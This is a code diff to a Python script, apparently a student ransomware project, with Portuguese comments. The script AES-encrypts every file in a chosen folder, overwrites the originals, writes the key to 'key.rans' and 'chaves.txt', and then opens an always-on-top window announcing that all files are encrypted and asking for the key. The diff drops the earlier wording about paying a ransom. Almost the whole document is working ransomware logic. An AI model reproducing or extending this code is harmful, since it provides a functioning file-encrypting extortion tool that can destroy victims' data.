@@ -2,30 +2,43 @@ import os
 import secrets
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES
-import pickle
 import tkinter as tk
-from tkinter import messagebox
 from decriptar import descriptografar
+import shutil
 
-
-# Gere uma chave AES de 256 bits (32 bytes)
+# Gera uma chave AES de 256 bits (32 bytes)
 key = secrets.token_bytes(32)
-
 # Vetor de inicialização (IV) - deve ser diferente para cada arquivo
 iv = get_random_bytes(16)
 
+caminho_chave_txt = os.path.join(os.getcwd(), "chaves.txt")
+with open(caminho_chave_txt, "w") as f:
+    f.write(key.hex() + iv.hex())
+
+# Salvar chave e IV no arquivo 'key.rans'
+with open('key.rans', 'wb') as arquivo:
+    arquivo.write((key.hex() + iv.hex()).encode())
+
+def mover_key(caminho_pasta):
+    # Caminho do arquivo que você deseja mover
+    caminho_arquivo_origem = os.path.join(os.getcwd(), "key.rans")
+    # Caminho de destino, onde o arquivo será movido
+    caminho_arquivo_destino = os.path.join(caminho_pasta, "key.rans")
+    # Verifica se o arquivo existe
+    if os.path.exists(caminho_arquivo_origem):
+        # Mover o arquivo
+        shutil.move(caminho_arquivo_origem, caminho_arquivo_destino)
 
 def show_encryption_message():
     def decrypt_files():
-        path = entry.get()
-        with open("path_to_key.txt", "w") as f:
-            f.write(path)
+        chave_hex = entry.get()
+        descriptografar(caminho_pasta, chave_hex)
         root.destroy()
 
     root = tk.Tk()
-    root.attributes('-topmost', True)  # Traz a janela para o primeiro plano
+    root.attributes('-topmost', True)
 
-    message_label = tk.Label(root, text="Todos os seus arquivos foram criptografados!\nPara resgatá-los pague o resgate ou insira o caminho do arquivo 'chaves' para descriptografar:")
+    message_label = tk.Label(root, text="Todos os seus arquivos foram criptografados!\nPara resgatá-los, insira a chave para descriptografar:")
     message_label.pack(pady=20)
 
     entry = tk.Entry(root, width=100)
@@ -36,9 +49,6 @@ def show_encryption_message():
 
     root.mainloop()
 
-
-with open('chaves', 'wb') as arquivo:
-    pickle.dump((key, iv), arquivo)
 
 # Pasta que você deseja criptografar
 caminho_pasta = input("Digite o caminho da pasta que deseja criptografar:")
@@ -59,7 +69,9 @@ for arquivo in arquivos:
         with open(os.path.join(caminho_pasta, arquivo), 'wb') as arquivo_criptografado:
             arquivo_criptografado.write(dados_criptografados)
 
+# Move o arquivo Key.rans para a pasta onde os arquivos encriptados estão salvos
+mover_key(caminho_pasta)
+
+# Apresenta mensagem para usuário que arquivos foram encriptados e solicita a chave para decriptar
 show_encryption_message()
 
-# Em algum lugar após show_encryption_message()
-descriptografar(caminho_pasta, "chaves")
